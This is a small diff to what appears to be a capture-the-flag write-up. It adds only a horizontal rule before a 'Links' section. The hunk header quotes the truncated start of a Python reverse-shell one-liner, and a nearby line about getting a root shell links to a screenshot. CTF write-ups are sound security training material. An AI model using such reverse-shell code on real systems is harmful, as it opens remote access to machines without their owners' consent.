@@ -88,6 +88,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 + Get the root shell:
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c1b923d8-5e44-4c00-b9ab-c0405253686a)
 
+---
 
 # Links
 
